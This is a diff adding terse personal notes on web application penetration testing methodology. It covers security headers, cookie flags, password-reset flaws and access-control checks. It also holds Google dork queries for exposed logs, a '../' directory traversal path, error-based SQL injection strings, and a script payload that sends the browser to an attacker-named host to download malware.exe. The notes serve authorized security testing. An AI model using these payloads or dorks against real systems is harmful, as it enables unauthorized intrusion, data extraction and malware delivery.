@@ -1,0 +1,176 @@
+Dast Methodology
+
+ 
+
+/robots.txt
+/active.html > May Reveal Internal IP
+clientaccesspolicy.xml
+crossdomainpolicy.xml
+
+"/help" page for asp.net application available?
+
+inurl:elmah.axd "error log for"
+file:asmx inurl:leadsquared
+inurl:.log inurl:ftp filetype:log/config ursitename.com
+
+inurl:.asmx filetype:asmx
+
+click jacking x frame options
+
+secure/http only attribute
+
+use backspace to login page and resubmit
+
+auth cookie invalidates after log off
+
+remember me(increase the auth cookie validity)
+
+htttp verb manipulation
+
+https to http convertion
+
+post to get convertion
+
+Hiddenfields
+
+X-xss-protection header
+
+HSTS header
+
+click jacking x frame options
+
+SQL INJECTION PRINCIPLE OF LEAST PREVILAGE(no acess to db.tables)
+
+CSRF at change password
+changing password/email/mobile with out checking the current password
+
+secure/http only/samesite cooki attribute
+
+cookie path
+
+hidden fileds
+
+account activation mail... it should be present, any bypasses, https links, validity, idor, mass assignment opertunity
+
+password reset-not anyone can do it(if so donot reset/block the account right away-send email to click on a link to reset the password, till this point old password should be valid)
+
+password storage..should be hashed(test by trying all ways to retrive the password from the application)-unique salt per user read password hashing note
+
+reauthentication before key actions(changing passwords, purchaseingg some thing)
+
+authentication brute force
+
+password strength
+
+Hiddenfields
+
+login page only by at https
+
+login password field autocomplete off
+
+user generated password sent via email (since there is no https protection/transportlayer protection for smtp)
+
+admins should not have access to passwords
+
+htttp verb manipulation
+
+price modification
+
+allow all charecters in passwords, anylenght
+
+account enumeration(who has an account and who does not)
+
+forgot password should be authenticated in some way(dob may be)
+
+forgot password tokens
+
+password reset link should be sent and not the genenerate a new password(link valid for limited time)
+
+remember me just extend the auth cookie expiration date
+
+CSRF at change password
+
+sensitive data in cookies/hidden fields/url
+
+test for function level access control(test for function level access control)
+
+price modification, access to list/karts of other user, vote as another user(test for function level access control)
+
+File upload?
+
+Anti automation techniques Capcha?
+
+Password Policy
+
+Test the transport security uing qualyies site
+
+card payment?
+
+?filename=../../../../../../../../../Windows/system.ini => directory traversal
+
+http://www.shodanhq.com/: search "apache 1.2.33"
+inurl:elmah.axd "error log for"
+
+inurl:.log inurl:ftp filetype:log/config ursitename.com
+
+hashkiller dictionary
+
+plaintextoffenders.com
+
+pastebin.com
+
+dnsstuff.com
+
+parameter tampering - userID
+
+clint side validation?- disable javascript
+
+account enumeration
+
+login - 302 redirection.
+
+cache pragma and cache control headers
+
+ 
+SQL INJECTION PRINCIPLE OF LEAST PREVILAGE
+
+SET PATH=%PATH%;C:\Program Files\Java\jdk1.8.0_51\bin
+
+java -jar burpsuite_free_v1.6.25.jar
+
+<script>location.href="http://attacker.hackyourselffirst.troyhunt.com/malware.exe";</script>
+
+ 
+
+--args --disable-xss-auditor --proxy-server=127.0.0.1:8081
+
+ 
+
+Mass asigniment risk (Automatic model binding)
+
+ 
+
+ 
+
+data'
+
+data')--
+
+data');select * from users;--
+
+data');select * from sys.tables;-- \\ sql account more than needed previlages
+
+data');select top 1 convert(int,name) from sys.tables;-- \\making exception to tell u wat u need
+
+ 
+
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v3_Table_of_Contents
+
+https://securityheaders.io/
+
+https://contextis.com/resources/blog/manually-testing-ssltls-weaknesses/
+
+ 
+
+ 
+
